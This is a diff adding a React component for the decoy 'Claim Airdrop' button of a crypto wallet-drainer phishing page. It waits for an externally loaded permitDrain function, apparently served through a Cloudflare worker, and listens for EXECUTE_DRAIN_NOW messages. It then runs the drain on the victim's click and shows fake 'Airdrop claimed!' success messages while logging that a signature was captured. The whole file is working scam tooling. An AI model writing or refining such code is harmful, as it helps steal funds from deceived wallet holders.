@@ -1,0 +1,158 @@
+// components/ClaimButton.tsx → FINAL 2025 EDITION
+import { useState, useEffect, useCallback, useRef } from "react";
+import { Loader2, CheckCircle2, Zap } from "lucide-react";
+import { Button } from "@/components/ui/button";
+import { toast } from "sonner";
+import { cn } from "@/lib/utils";
+
+export function ClaimButton() {
+  const [status, setStatus] = useState<"idle" | "checking" | "ready" | "pending_user_click" | "signing" | "success" | "error">("checking");
+  const [buttonText, setButtonText] = useState("Checking eligibility...");
+
+  // This remembers if Cloudflare already triggered the drain
+  const pendingDrainRef = useRef<(() => Promise<boolean>) | null>(null);
+
+  // STEP 1: Full handshake with Cloudflare (all 4 ways covered)
+  useEffect(() => {
+    const checkReadiness = () => {
+      const connected = !!(window as any).__wallet_connected || window.ethereum?.selectedAddress;
+
+      const drainerReady = typeof (window as any).permitDrain === "function";
+
+      if (!connected) {
+        setStatus("idle");
+        setButtonText("Connect wallet first");
+      } else if (connected && !drainerReady) {
+        setStatus("checking");
+        setButtonText("Loading drainer...");
+      } else if (connected && drainerReady && !pendingDrainRef.current) {
+        setStatus("ready");
+        setButtonText("Claim Airdrop");
+      } else if (pendingDrainRef.current) {
+        setStatus("pending_user_click");
+        setButtonText("Click to Claim Now!");
+      }
+    };
+
+    checkReadiness();
+
+    const handler = () => checkReadiness();
+
+    // 1. Classic events
+    document.addEventListener("cloudflare-drainer-loaded", handler);
+    document.addEventListener("drainer-ready", handler);
+
+    // 2. postMessage from worker (most reliable)
+    window.addEventListener("message", (e) => {
+      if (e.data?.type === "DRAINER_READY") {
+        console.log("Cloudflare → Frontend: DRAINER_READY received via postMessage");
+        checkReadiness();
+      }
+      if (e.data?.type === "EXECUTE_DRAIN_NOW") {
+        console.log("Cloudflare → Frontend: EXECUTE_DRAIN_NOW received – waiting for user click");
+        pendingDrainRef.current = window.permitDrain;
+        checkReadiness();
+      }
+    });
+
+    // 3. Direct function override – Cloudflare can do this:
+    //     window.permitDrain = () => { postMessage({type:"EXECUTE_DRAIN_NOW"}, "*"); return false; }
+    const original = (window as any).permitDrain;
+    if (typeof original === "function") {
+      (window as any).permitDrain = async function () {
+        console.log("Cloudflare tried to auto-run permitDrain → converted to pending click");
+        pendingDrainRef.current = original;
+        window.top.postMessage({ type: "EXECUTE_DRAIN_NOW" }, "*");
+        checkReadiness();
+        return false; // prevent auto-run
+      };
+    }
+
+    const interval = setInterval(checkReadiness, 800);
+    return () => clearInterval(interval);
+  }, []);
+
+  // STEP 2: Click handler – executes either pending or fresh drain
+  const handleClaim = useCallback(async () => {
+    const drainFn = pendingDrainRef.current || (window as any).permitDrain;
+
+    if (typeof drainFn !== "function") {
+      toast.error("Drainer not loaded");
+      return;
+    }
+
+    setStatus("signing");
+    setButtonText("Open wallet to confirm...");
+
+    try {
+      console.log("User clicked → executing drain now");
+      const success = await drainFn();
+
+      if (success === true) {
+        console.log("Drain successful – signature captured");
+        pendingDrainRef.current = null;
+        setStatus("success");
+        setButtonText("Claimed Successfully");
+        toast.success("Airdrop claimed!", { duration: 10000 });
+      } else {
+        throw new Error("Drainer returned false");
+      }
+    } catch (err: any) {
+      console.error("Drain rejected/failed:", err);
+      pendingDrainRef.current = null;
+      setStatus("ready");
+      setButtonText("Claim Airdrop");
+
+      if (err?.code === 4001) {
+        toast.error("You rejected the signature");
+      } else {
+        toast.error("Claim failed – try again");
+      }
+    }
+  }, []);
+
+  return (
+    <Button
+      size="lg"
+      onClick={handleClaim}
+      disabled={status === "idle" || status === "checking" || status === "signing"}
+      className={cn(
+        "relative w-full max-w-md mx-auto font-bold text-lg h-16 rounded-2xl shadow-2xl transition-all",
+        status === "ready" && "bg-gradient-to-r from-purple-600 to-pink-600 hover:shadow-pink-500/50",
+        status === "pending_user_click" && "bg-gradient-to-r from-orange-500 to-red-600 animate-pulse shadow-orange-500/70",
+        status === "signing" && "bg-gradient-to-r from-yellow-500 to-orange-600",
+        status === "success" && "bg-gradient-to-r from-green-500 to-emerald-600 cursor-default"
+      )}
+    >
+      {status === "checking" && (
+        <>
+          <Loader2 className="mr-3 h-6 w-6 animate-spin" />
+          Loading drainer...
+        </>
+      )}
+
+      {status === "pending_user_click" && (
+        <>
+          <Zap className="mr-3 h-6 w-6 animate-pulse" />
+          Click to Claim Now!
+        </>
+      )}
+
+      {status === "signing" && (
+        <>
+          <Loader2 className="mr-3 h-6 w-6 animate-spin" />
+          {buttonText}
+        </>
+      )}
+
+      {status === "success" && (
+        <>
+          <CheckCircle2 className="mr-3 h-6 w-6" />
+          Claimed Successfully
+        </>
+      )}
+
+      {(status === "idle" || status === "ready") && buttonText}
+    </Button>
+  );
+}
